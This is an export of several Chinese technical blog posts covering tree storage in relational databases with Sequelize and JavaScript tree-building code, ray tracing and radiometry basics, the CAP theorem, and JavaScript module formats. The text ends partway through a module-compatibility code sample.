<h1 id="关系数据库中存储树结构的方法"><a href="#关系数据库中存储树结构的方法" class="headerlink" title="关系数据库中存储树结构的方法"></a>关系数据库中存储树结构的方法</h1><h2 id="层级数据设计方案"><a href="#层级数据设计方案" class="headerlink" title="层级数据设计方案"></a>层级数据设计方案</h2><p>在关系数据库中存储树结构主要有以下几种方案：</p>
<ul>
<li>邻接表模型</li>
</ul>
<p>最常见的解决方案，在数据库表中添加parent_id字段，再引用同一张表中的其他记录的id。可通过一个外键约束维护这种关系。</p>
<p>优点：增加叶节点、修改节点或子树位置很方便。</p>
<p>缺点：查询节点的所有后代、删除子树很困难。</p>
<ul>
<li>路径枚举</li>
</ul>
<p>路径枚举是一个由连续的直接层级关系组成的完整路径。例如/usr/local/lib。</p>
<p>优点：查询节点所有后代、插入新节点很方便。<br>缺点：依赖应用程序逻辑代码维护路径字符串，验证字符串正确性开销大。受限于字符串长度，树结构无法无限扩展。</p>
<ul>
<li>嵌套集</li>
</ul>
<p>嵌套集解决方案是存储子孙节点的相关信息，而不是节点的直接祖先。通常使用两个数字nsleft和nsright编码每个节点，以表示子孙节点信息。</p>
<p>nsleft的数值小于该节点所有后代的ID，同时nsright的值大于该节点所有后代的ID。</p>
<p>确定这三个值（nsleft，ID，nsright）的简单方法是对树进行一次深度优先遍历，在逐层深入过程中依次递增地分配nsleft的值，并在返回时依次递增地分配nsright的值。</p>
<p>优点：查询给定节点祖先和后代很容易，删除非叶子节点，其后代会自动代替被删除节点成为其祖先节点的直接后代。</p>
<p>缺点：不易理解，插入和移动节点复杂。</p>
<ul>
<li>闭包表</li>
</ul>
<p>闭包表通过额外的数据库表记录树中节点间父子的关系，包括直接的父子关系、间接的父子关系和指向自己的关系。</p>
<h2 id="层级数据设计比较"><a href="#层级数据设计比较" class="headerlink" title="层级数据设计比较"></a>层级数据设计比较</h2><center>层级数据设计比较</center>

<table>
<thead>
<tr>
<th>设计</th>
<th>表</th>
<th>查询子</th>
<th>查询树</th>
<th>插入</th>
<th>删除</th>
<th>引用完整性</th>
</tr>
</thead>
<tbody><tr>
<td>邻接表</td>
<td>1</td>
<td>简单</td>
<td>困难</td>
<td>简单</td>
<td>简单</td>
<td>是</td>
</tr>
<tr>
<td>邻接表+递归查询</td>
<td>1</td>
<td>简单</td>
<td>简单</td>
<td>简单</td>
<td>简单</td>
<td>否</td>
</tr>
<tr>
<td>路径枚举</td>
<td>1</td>
<td>简单</td>
<td>简单</td>
<td>简单</td>
<td>简单</td>
<td>否</td>
</tr>
<tr>
<td>嵌套集</td>
<td>1</td>
<td>困难</td>
<td>简单</td>
<td>困难</td>
<td>困难</td>
<td>否</td>
</tr>
<tr>
<td>闭包集</td>
<td>2</td>
<td>简单</td>
<td>简单</td>
<td>简单</td>
<td>简单</td>
<td>是</td>
</tr>
</tbody></table>
<ul>
<li>邻接表设计最简单，如果使用的数据库支持WITH或CONNECT BY PRIOR的递归查询，将使得邻接表查询更为高效。</li>
</ul>
<h1 id="前端从关系数据库中还原树结构"><a href="#前端从关系数据库中还原树结构" class="headerlink" title="前端从关系数据库中还原树结构"></a>前端从关系数据库中还原树结构</h1><p>表结构，使用sequelize的对象表示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line">module.exports &#x3D; (sequelize, DataTypes) &#x3D;&gt; &#123;</span><br><span class="line">  const Role &#x3D; sequelize.define(&#39;Role&#39;, &#123;</span><br><span class="line">    id: &#123;</span><br><span class="line">      type: DataTypes.STRING(50),</span><br><span class="line">      primaryKey: true</span><br><span class="line">    &#125;,</span><br><span class="line">    roleName: &#123;</span><br><span class="line">      type: DataTypes.STRING(128),</span><br><span class="line">      allowNull: false</span><br><span class="line">    &#125;,</span><br><span class="line">    path: &#123;</span><br><span class="line">      type: DataTypes.STRING(512),</span><br><span class="line">      allowNull: false,</span><br><span class="line">      unique: true,</span><br><span class="line">      comment: &#39;角色路径唯一！&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">    deleteFlag:&#123;</span><br><span class="line">      type: DataTypes.BOOLEAN,</span><br><span class="line">      defaultValue: false</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, &#123;&#125;);</span><br><span class="line">  Role.associate &#x3D; function(models) &#123;</span><br><span class="line">    &#x2F;&#x2F; associations can be defined here</span><br><span class="line">    Role.hasMany(models.User)</span><br><span class="line">  &#125;;</span><br><span class="line">  return Role;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>递归生成角色树：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取第一层节点</span><br><span class="line">function getFirstLevel(recordList)&#123;</span><br><span class="line">    var firstLevelList&#x3D;[];</span><br><span class="line">    for(let i&#x3D;0;i&lt; recordList.length;i++)&#123;</span><br><span class="line">        let record&#x3D;recordList[i]</span><br><span class="line">        if (record.path.length &#x3D;&#x3D;&#x3D; 2 &amp;&amp; record.path.split(&#39;&#39;)[1] &#x3D;&#x3D;&#x3D; &#39;&#x2F;&#39; &amp;&amp; parseInt(record.path.split(&#39;&#39;)[0])&gt;&#x3D;0)&#123;</span><br><span class="line">            record.label&#x3D;record.roleName</span><br><span class="line">            firstLevelList.push(record)</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    return firstLevelList</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 指定根节点，递归生成角色树</span><br><span class="line">function recursiveTree(parentRecord,recordList)&#123;</span><br><span class="line">    for (let i &#x3D; 0; i &lt; recordList.length; i++)&#123;</span><br><span class="line">        let record &#x3D; recordList[i]</span><br><span class="line">        if(parentRecord.path&#x3D;&#x3D;record.path.slice(0,-2))&#123;</span><br><span class="line">            record&#x3D;recursiveTree(record,recordList)</span><br><span class="line">            if (parentRecord.children&#x3D;&#x3D;undefined)&#123;</span><br><span class="line">                parentRecord.children&#x3D;[]</span><br><span class="line">            &#125;</span><br><span class="line">            parentRecord.children.push(record)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    parentRecord.label &#x3D; parentRecord.roleName</span><br><span class="line">    return parentRecord</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 生成角色树</span><br><span class="line">export function parseRoleTree(recordList)&#123;</span><br><span class="line">    var result &#x3D; getFirstLevel(recordList);</span><br><span class="line"></span><br><span class="line">    for (let i&#x3D;0;i&lt;result.length;i++)&#123;</span><br><span class="line">        parent &#x3D; result[i]</span><br><span class="line">        parent &#x3D; recursiveTree(parent, recordList)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/LDY1016/article/details/85784001" target="_blank" rel="noopener">java递归生成树形结构菜单</a>,by 伊宇紫.</li>
<li>Bill Karwin著,谭振林,Push Chen译. SQL反模式[M].人民邮电出版社.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>光线追踪基本概念入门</title>
    <url>/2019/05/26/%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>光线追踪（Ray tracing）是三维计算机图形学中的特殊渲染算法，跟踪从眼睛发出的光线而不是光源发出的光线，通过这样一项技术生成编排好的场景的数学模型显现出来。光线追踪的优点可以提供更为真实的光影效果，缺点是计算量巨大。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>光线追踪与光栅化渲染作为相对的两个概念，理解光栅化渲染更能解释光线追踪的概念。</p>
<p>光栅化渲染是将向量图形格式表示的图像转换成位图以用于显示器或者打印机输出的过程，如图1所示。</p>
<p align="center">
    <img src="images/rasterrizer.png" width="90%" alt="光线追踪示意图"/>
</p>
<center>图1  光栅化渲染示意图</center>

<p>光线追踪的示意图如图2所示。[Whitted 1980]提出了使用光线跟踪来在计算机上生成图像的方法，这一方法后来也被称为经典光线跟踪方法或Whitted-style 光线跟踪方法。其主要思想是从视点向成像平面上的像素发射光线，找到与该光线相交的最近物体的交点，如果该点处的表面是散射面，则计算光源直接照射该点产生的颜色；如果该点处表面是镜面或折射面，则继续向反射或折射方向跟踪另一条光线，如此递归下去，直到光线逃逸出场景或达到设定的最大递归深度。这种经典的方法可以产生镜面反射、折射、阴影等效果，不过不能实现其他的全局光照的效果。</p>
<p align="center">
    <img src="images/ray_track.jpg" width="90%" alt="光线追踪示意图"/>
</p>
<center>图2  光线追踪示意图</center>

<h1 id="辐射度学基本量"><a href="#辐射度学基本量" class="headerlink" title="辐射度学基本量"></a>辐射度学基本量</h1><p>图形学模拟可见光与各种材质的交互，这个过程涉及到能量的传输。辐射度学（Radiometry）是度量电磁辐射能量传输的学科，也是基于物理着色模型的基础。</p>
<ul>
<li>能量</li>
</ul>
<p>能量（Energy），用符号Q表示，单位焦耳（J），每个光子都具有一定量的能量，和频率相关，频率越高，能量也越高。</p>
<ul>
<li>功率</li>
</ul>
<p>功率（Power），单位瓦特（Watts），或者焦耳／秒（J/s）。辐射度学中，辐射功率也被称为辐射通量（Radiant Flux）或者通量（Flux），指单位时间内通过表面或者空间区域的能量的总量，用符号\Phi 表示，定义 $\Phi = \frac{ dQ}{dt}$。</p>
<ul>
<li>辐照度和辐出度</li>
</ul>
<p>辐照度（Irradiance），指单位时间内到达单位面积的辐射能量，或到达单位面积的辐射通量，也就是通量对于面积的密度。用符号E表示，单位 $W / m^{2}$ 。定义为 $E = \frac{d\Phi }{dA}$。</p>
<p>辐出度（Radiant Existance），也称为辐射出射度、辐射度（Radiosity），用符号M表示。辐出度与辐照度类似，唯一的区别在辐出度衡量的是离开表面的通量密度，辐照度衡量的是到达表面的通量密度。辐照度和辐出度都可以称为辐射通量密度（Radiant Flux Density）。</p>
<ul>
<li>辐射强度</li>
</ul>
<p>立体角则是度量三维角度的量，用符号 $\omega$ 表示，单位为立体弧度（也叫球面度，Steradian，简写为sr），等于立体角在单位球上对应的区域的面积（实际上也就是在任意半径的球上的面积除以半径的平方 $\omega = \frac {s}{r^{2} }$ ），单位球的表面积是 $4\pi$ ，所以整个球面的立体角也是$4\pi$ 。</p>
<p>辐射强度（Radiant Intensity），指通过单位立体角的辐射通量。用符号I表示，单位 $W / sr$，定义为 $I = \frac{d \Phi }{d \omega }$ 。之所以引入辐射强度，是因为有时候要度量通过一个点的通量的密度，但因为点的面积是0，无法使用辐照度，所以引入辐射强度。辐射强度不会随距离变化而变化，不像点光源的辐照度会随距离增大而衰减，这是因为立体角不会随距离变化而变化。</p>
<ul>
<li>辐射率</li>
</ul>
<p>辐射率（Radiance），指每单位面积每单位立体角的辐射通量密度。用符号 $L$ 表示，单位 $W/m^{2} sr$ ，定义为 $L = \frac{d \Phi }{d\omega d A^{\bot } }$ 。其中  $dA^{\bot}$是微分面积dA在垂直于光线方向的投影。</p>
<h1 id="渲染方程（The-Rendering-Equation）"><a href="#渲染方程（The-Rendering-Equation）" class="headerlink" title="渲染方程（The Rendering Equation）"></a>渲染方程（The Rendering Equation）</h1><p>[Kajiya 1986]第一次将渲染方程引入图形学，使用它来解释光能传输的产生的各种现象。这一方程描述了场景中光能传输达到稳定状态以后，物体表面某个点在某个方向上的辐射亮度（Radiance）与入射辐射亮度等的关系。</p>
<p>$$L_o(x,w_o)=L_e(x,w_0)+\int_\Omega{f_r(x,w_i,w_0)L_i(x,w_i)cos\theta_idw_i}$$</p>
<p>其中，$L_o(x,w_o)$ 表示物体表面点 $x$ 处在方向  $𝜔_𝑜$  上出射的辐射亮度，$𝐿𝑒(𝑥, 𝜔_0)$ 表示在该点该方向上自辐射的亮度。$𝐿𝑖(𝑥,𝜔_𝑖)$ 表示该点处 $𝜔_𝑖$ 方向入射的辐射亮度，$𝑓𝑟(𝑥, 𝜔_𝑖, 𝜔_𝑜)$ 是双向反射分布函数（BRDF），描述的是入射方向的辐射亮度对出射方向的贡献，$cos 𝜃𝑖$ 是$𝜔_𝑖$与表面法向的点积。在这一方程的基础上，辐射度方法和蒙特卡罗光线跟踪的方法就可以看成是对方程中积分的不同的数值求解方法。</p>
<p>BRDF描述的是表面本身的性质，比如它的光滑程度，导电程度等等。由于四面八方的光线都会作用在这个表面，所以我们需要对所有方向进行积分，也就是一个球面上的积分，考虑到积分项中的 $(w_i\cdot n)$ ，那么只有位于正半空间的方向才会对最终积分有贡献，所以最后这个球面的积分就变成了一个半球的积分，如图3所示。</p>
<p align="center">
    <img src="images/brdf.jpg" width="90%" alt="光线追踪示意图"/>
</p>
<center>图3  BRDF示意图</center>

<h1 id="双向反射分布函数（bidirectional-reflectance-distribution-function-BRDF）"><a href="#双向反射分布函数（bidirectional-reflectance-distribution-function-BRDF）" class="headerlink" title="双向反射分布函数（bidirectional reflectance distribution function, BRDF）"></a>双向反射分布函数（bidirectional reflectance distribution function, BRDF）</h1><p>在计算机图形学领域，着色（Shading）是指根据表面或者多边形相对光源和相机的角度和距离来计算它的颜色的过程。不同的用途可以使用不同的着色算法，CAD等追求响应速度的交互式图形领域可以使用简单快速的着色算法，卡通油画等艺术效果可以使用非真实感（Nonphotorealistic）着色算法，而追求真实感的CG电影或游戏则可以使用基于物理建模的着色算法。而BRDF是基于物理建模的着色算法的理论基础。</p>
<p>我们看到一个表面，实际上是周围环境的光照射到表面上，然后表面将一部分光反射到我们眼睛里。双向反射分布函数BRDF（Bidirectional Reflectance Distribution Function）就是描述表面入射光和反射光关系的。</p>
<p>对于一个方向的入射光，表面会将光反射到表面上半球的各个方向，不同方向反射的比例是不同的，我们用BRDF来表示指定方向的反射光和入射光的比例关系，BRDF定义为：</p>
<p>$$f(l,v)=\frac{dL_o(v)}{dE(l)}$$</p>
<p>其中，$f$就是BRDF，$l$是入射光方向，$v$是观察方向，也就是我们关心的反射光方向。$d L_o(v)$ 是表面反射到$v$方向的反射光的微分辐射率。表面反射到$v$方向的反射光的辐射率为$L_o(v)$，来自于表面上半球所有方向的入射光线的贡献，而微分辐射率 $d L_o(v)$ 特指来自方向 $l$ 的入射光贡献的反射辐射率。$dE(l)$是表面上来自入射光方向 $l$ 的微分辐照度。表面接收到的辐照度为 $E$ ，来自上半球所有方向的入射光线的贡献，而微分辐照度 $dE(l)$ 特指来自于方向 $l$ 的入射光。</p>
<h1 id="光照模型（illumination-model）"><a href="#光照模型（illumination-model）" class="headerlink" title="光照模型（illumination model）"></a>光照模型（illumination model）</h1><p>当光照射到物体表面时,物体对光会发生反射、透射、吸收、衍射、折射、和干涉,其中被物体吸收的部分转化为热,反射、透射的光进入人的视觉系统,使我们能看见物体。<strong>为模拟这一现象,我们建立一些数学模型来替代复杂的物理模型，这些模型就称为明暗效应模型或者光照明模型。</strong></p>
<h2 id="局部光照模型"><a href="#局部光照模型" class="headerlink" title="局部光照模型"></a>局部光照模型</h2><p>在真实感图形学中,仅处理光源直接照射物体表面的光照明模型被称为局部光照明模型。局部光照明模型的分类如图4所示。</p>
<p align="center">
    <img src="images/localLightModel.jpg" width="90%" alt="局部光照模型分类"/>
</p>
<center>图4  局部光照模型分类</center>

<p>局部光照模型是一种比较简单的光照模型，它是与光栅化渲染算法相适应的，光栅化算法一次只考虑一个像素的光照强度，因此局部光照模型不能计算某像素受其他像素影响的光照强度部分。也就是说，局部光照模型只对物体进行直接光照的计算，而不考虑其他的间接影响。</p>
<h2 id="全局光照模型"><a href="#全局光照模型" class="headerlink" title="全局光照模型"></a>全局光照模型</h2><p>全局光照模型是基于光学物理原理的，光照强度的计算依赖于光能在现实世界中的传播情况，考虑光线与整个场景中各物体表面及物体表面间的相互影响，包括多次反射 、透射 、散射等。因此，与局部光照模型相比，全局光照模型需要相当大的计算量 ，但同时也能取得非常逼真的真实效果 。全局光照模型分类如图5所示。</p>
<p align="center">
    <img src="images/globalLightModel.jpg" width="90%" alt="全局光照模型分类"/>
</p>
<center>图5  全局光照模型分类</center>

<h1 id="求交检测"><a href="#求交检测" class="headerlink" title="求交检测"></a>求交检测</h1><p>在光线追踪过程中，从眼睛发出的光线与3D模型的三角面求交是一个复杂问题。通常精致的3D模型可能由几十万至上百万三角面构成，如果采用穷举法求交点，其时间复杂度将是O(n), 过于复杂。为了减少不必要的求交检测，应采用空间划分技术，最常用的是平衡kdtree算法，提高求交检测的效率。</p>
<h2 id="k-d-tree"><a href="#k-d-tree" class="headerlink" title="k-d tree"></a>k-d tree</h2><p>在计算机科学里，k-d树（ k-维树的缩写）是在k维欧几里德空间组织点的数据结构。k-d树可以使用在多种应用场合，如多维键值搜索（例：范围搜寻及最邻近搜索）。k-d树是空间二分树（Binary space partitioning ）的一种特殊情况。</p>
<p>k-d树是每个节点都为k维点的二叉树。所有非叶子节点可以视作用一个超平面把空间分割成两个半空间。节点左边的子树代表在超平面左边的点，节点右边的子树代表在超平面右边的点。选择超平面的方法如下：每个节点都与k维中垂直于超平面的那一维有关。因此，如果选择按照x轴划分，所有x值小于指定值的节点都会出现在左子树，所有x值大于指定值的节点都会出现在右子树。这样，超平面可以用该x值来确定，其法线为x轴的单位向量。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/zh-hans/%E5%85%89%E7%B7%9A%E8%BF%BD%E8%B9%A4" target="_blank" rel="noopener">光线追踪</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%A0%85%E6%A0%BC%E5%8C%96" target="_blank" rel="noopener">栅格化</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%B8%B2%E6%9F%93" target="_blank" rel="noopener">渲染</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/baishuo8/article/details/81476422" target="_blank" rel="noopener">光线追踪基本概念与代码实现</a>,by 鹅城惊喜师爷.</li>
<li><a href="https://zhuanlan.zhihu.com/p/41269520" target="_blank" rel="noopener">一篇光线追踪的入门</a>,by 洛城.</li>
<li><a href="https://www.jun.ninja/projects/gcg/report.pdf" target="_blank" rel="noopener">基于蒙特卡罗的光线跟踪绘制方法</a>,by 严俊.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21376124" target="_blank" rel="noopener">基于物理着色：BRDF</a>,by Maple.</li>
<li><a href="https://zhuanlan.zhihu.com/p/29536356" target="_blank" rel="noopener">Monte-Carlo Ray Tracing System (一)原理以及设计</a>,by 已退逼乎.</li>
<li><a href="https://blog.csdn.net/ZCMUCZX/article/details/79683263" target="_blank" rel="noopener">冯氏光照模型–镜面光的计算</a>,by MooAiFighting.</li>
<li><a href="https://zhuanlan.zhihu.com/p/49474631" target="_blank" rel="noopener">什么是光照模型</a>,by 黄琦.</li>
<li><a href="https://blog.csdn.net/sunacmer/article/details/7451861" target="_blank" rel="noopener">蒙特卡洛光线追踪</a>,by sunacmer.</li>
<li><a href="https://zh.wikipedia.org/wiki/K-d%E6%A0%91" target="_blank" rel="noopener">k-d树</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/a6333230/article/details/82968484" target="_blank" rel="noopener">辐射强度、辐亮度、辐照度——一文搞定</a>,by 三眼二郎.</li>
<li><a href="https://www.bilibili.com/video/BV1vB4y1P7Ar/" target="_blank" rel="noopener">从光栅化到光线追踪</a>,by CrazyEngineCo.</li>
<li><a href="https://blog.csdn.net/zhazhiqiang/article/details/19676477" target="_blank" rel="noopener">windows下没有srand48和drand48的解决方法</a>,by 查志强.</li>
<li><a href="https://blog.csdn.net/a6333230/article/details/90036993" target="_blank" rel="noopener">辐射照度、辐射强度、光照度、发光强度（差异以及如何相互转换）（易懂讲解）</a>,by 三眼二郎.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式系统的CAP理论简介</title>
    <url>/2019/02/17/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%9A%84CAP%E7%90%86%E8%AE%BA%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h1 id="分布式系统定义"><a href="#分布式系统定义" class="headerlink" title="分布式系统定义"></a>分布式系统定义</h1><blockquote>
<p>分布式系统是其组件分布正在连网的计算机上，组件之间通过传递消息进行通信和动作协调的系统<sup>[1]</sup>。通过该定义可知，分布式系统具有以下重要特征：组件的并发性、缺乏全局时钟、组件故障的独立性。</p>
</blockquote>
<h1 id="CAP理论"><a href="#CAP理论" class="headerlink" title="CAP理论"></a>CAP理论</h1><p>CAP理论：一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availability）和分区容错性（Partition tolerance）这三项中的两项。</p>
<ul>
<li>一致性（Consistency）</li>
<li>可用性（Availability）</li>
<li>分区容错性（Partition Tolerance）</li>
</ul>
<h2 id="一致性（Consistency）"><a href="#一致性（Consistency）" class="headerlink" title="一致性（Consistency）"></a>一致性（Consistency）</h2><p>在分布式系统中,是指对于一组服务器,给定一组操作,我们需要一个协议使得最后它们的结果达成一致。更详细的解释就是,当其中某个服务器收到客户端的一组指令时,它必须与其它服务器交流以保证所有的服务器都是以同样的顺序收到同样的指令,这样的话所有的服务器会产生一致的结果,看起来就像是一台机器一样。</p>
<p>分布式系统的一致性算法分为：</p>
<ul>
<li>弱一致性（最终一致性），例如DNS域名解析。</li>
<li>强一致性，例如主从同步、多数派（读/写）、Paxos、Raft（multi Paxos）、ZAB（multi Paxos）。</li>
</ul>
<h2 id="可用性（Availability）"><a href="#可用性（Availability）" class="headerlink" title="可用性（Availability）"></a>可用性（Availability）</h2><p>对于一个可用性的分布式系统，每一个非故障的节点必须对每一个请求作出响应。所以，一般我们在衡量一个系统的可用性的时候，都是通过停机时间来计算的。</p>
<p>通常我们描述一个系统的可用性时，我们说淘宝的系统可用性可以达到5个9，意思就是说他的可用水平是99.999%，即全年停机时间不超过 $(1-0.99999)<em>365</em>24*60 = 5.256 min$ ，这是一个极高的要求。</p>
<h2 id="分区容错性（Partition-Tolerance）"><a href="#分区容错性（Partition-Tolerance）" class="headerlink" title="分区容错性（Partition Tolerance）"></a>分区容错性（Partition Tolerance）</h2><p>分布式系统在遇到某节点或网络分区故障的时候，仍然能够对外提供满足一致性和可用性的服务。</p>
<p>好的分区容错性要求能够使应用虽然是一个分布式系统，而看上去却好像是在一个可以运转正常的整体。比如现在的分布式系统中有某一个或者几个机器宕掉了，其他剩下的机器还能够正常运转满足系统需求，或者是机器之间有网络异常，将分布式系统分隔未独立的几个部分，各个部分还能维持分布式系统的运作，这样就具有好的分区容错性。</p>
<p>简单点说，就是在网络中断，消息丢失的情况下，系统如果还能正常工作，就是有比较好的分区容错性。</p>
<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ol>
<li>George Coulouris, Jean Dollimore， Tim Kindberg，Gordon Blair，金蓓弘，马应龙，等译. 分布式系统概念与设计[M].2013.</li>
<li><a href="https://zhuanlan.zhihu.com/p/49760579" target="_blank" rel="noopener">Zookeeper之分布式系统的一致性算法</a>, by 养兔子的大叔.</li>
<li><a href="https://zh.wikipedia.org/wiki/分布式计算" target="_blank" rel="noopener">分布式计算</a>,by wikipedia.</li>
<li><a href="https://www.hollischuang.com/archives/666" target="_blank" rel="noopener">分布式系统的CAP理论</a>,by HollisChuang.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>兼容前后端多种JS模块规范的代码</title>
    <url>/2018/07/02/%E5%85%BC%E5%AE%B9%E5%89%8D%E5%90%8E%E7%AB%AF%E5%A4%9A%E7%A7%8DJS%E6%A8%A1%E5%9D%97%E8%A7%84%E8%8C%83%E7%9A%84%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<p>最近研究如何在前后端调用同一份js代码。该问题本质是如何兼容前后端各类JS模块规范。上网一搜，已经有很多详细的解决方案和JS模块规范介绍，在这里简单记录一下。</p>
<h1 id="JS模块规范"><a href="#JS模块规范" class="headerlink" title="JS模块规范"></a>JS模块规范</h1><p>JS模块规范前端主要有AMD、CMD，后端主要有CommonJS。此外还有最新的ES2015模块规范。</p>
<h2 id="AMD"><a href="#AMD" class="headerlink" title="AMD"></a>AMD</h2><p>AMD（异步模块定义，Asynchronous Module Definition）格式总体的目标是为现在的开发者提供一个可用的模块化 JavaScript 的解决方案。它诞生于 Dojo 在使用 XHR+eval 时的实践经验，其支持者希望未来的解决方案都可以免受由于过去方案的缺陷所带来的麻烦。</p>
<p>AMD风格模块定义通常包括：一个用来进行模块定义的 define 方法以及一个用来处理依赖项加载的 require 方法。define 根据如下的方法签名来定义具名或匿名的模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(</span><br><span class="line">    module_id &#x2F;*可选*&#x2F;, </span><br><span class="line">    [dependencies] &#x2F;*可选*&#x2F;, </span><br><span class="line">    definition function &#x2F;*用来初始化模块或对象的函数*&#x2F;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>CMD(Common Module Definition)表示通用模块定义，该规范是国内发展出来的，由阿里的玉伯提出。就像AMD有个requireJS，CMD有个浏览器的实现SeaJS，SeaJS和requireJS一样，都是javascript的前端模块化解决方案。<br>CMD规范简单到只有一个API，即define函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(function(require, exports, module) &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; The module code goes here</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>CMD 与 AMD 挺相近，二者区别如下： </p>
<ul>
<li>对于依赖的模块 CMD 是延迟执行，而 AMD 是提前执行（不过 RequireJS 从 2.0 开始，也改成可以延迟执行。 ）</li>
<li>CMD 推崇依赖就近，AMD 推崇依赖前置。</li>
<li>AMD 的 api 默认是一个当多个用，CMD 严格的区分推崇职责单一，其每个 API 都简单纯粹。例如：AMD 里 require 分全局的和局部的。CMD 里面没有全局的 require，提供 seajs.use() 来实现模块系统的加载启动。</li>
</ul>
<h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p>CommonJS是一个志愿性质的工作组，它致力于设计、规划并标准化 JavaScript API。至今为止他们已经尝试着认可了模块标准以及程序包标准。CommonJS 的模块提案为在服务器端声明模块指定了一个简单的 API。不像 AMD，它试图覆盖更宽泛的方面比如 IO、文件系统、promise 模式等等。CommonJS风格模块在nodejs中得到广泛的应用。</p>
<p>CommonJS风格模块是一段可重用的 JavaScript，它导出一系列特定的对象给依赖它的代码调用——通常来说这样的模块外围没有函数包裹（所以你在这里的例子中不会看到 define）。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; package&#x2F;lib 是我们须要的一个依赖项</span><br><span class="line">var lib &#x3D; require(&#39;package&#x2F;lib&#39;);</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 我们的模块的一些行为</span><br><span class="line">function foo()&#123;</span><br><span class="line">    lib.log(&#39;hello world!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 把 foo 导出（暴露）给其它模块</span><br><span class="line">exports.foo &#x3D; foo;</span><br></pre></td></tr></table></figure>

<h2 id="ES2015模块规范"><a href="#ES2015模块规范" class="headerlink" title="ES2015模块规范"></a>ES2015模块规范</h2><p>2015 年 6 月， ES2015（即 ECMAScript 6、ES6） 正式发布。ES2015 是该语言的一个显著更新，也是自 2009 年 ES5 标准确定后的第一个重大更新。</p>
<p>ES2015的模块规范如下：</p>
<ul>
<li>一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。</li>
<li>export 命令用于规定模块的对外接口。</li>
<li>import 命令用于输入其他模块提供的功能。</li>
<li>ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。</li>
</ul>
<p>ES2015模块示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;circle.js</span><br><span class="line">&#x2F;&#x2F;圆面积计算</span><br><span class="line">export function area(radius) &#123;</span><br><span class="line">  return Math.PI * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;main.js</span><br><span class="line">import &#123;area&#125; from &#39;.&#x2F;hangge&#39;;</span><br><span class="line">console.log(&#39;圆面积：&#39; + area(10));</span><br></pre></td></tr></table></figure>

<h1 id="兼容多种模块规范"><a href="#兼容多种模块规范" class="headerlink" title="兼容多种模块规范"></a>兼容多种模块规范</h1><p>需要指出的是下面兼容多种JS模块规范的代码并不支持最新的ES2015模块规范。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;(function (name, definition) &#123;</span><br><span class="line">  &#x2F;&#x2F; 检测上下文环境是否为AMD或CMD</span><br><span class="line">  var hasDefine &#x3D; typeof define &#x3D;&#x3D;&#x3D; &#39;function&#39;,</span><br><span class="line">    &#x2F;&#x2F; 检查上下文环境是否为Node</span><br><span class="line">    hasExports &#x3D; typeof module !&#x3D;&#x3D; &#39;undefined&#39; &amp;&amp; module.exports;</span><br><span class="line"></span><br><span class="line">  if (hasDefine) &#123;</span><br><span class="line">    &#x2F;&#x2F; AMD环境或CMD环境</span><br><span class="line">    define(definition);</span><br><span class="line">  &#125; else if (hasExports) &#123;</span><br><span class="line">    &#x2F;&#x2F; 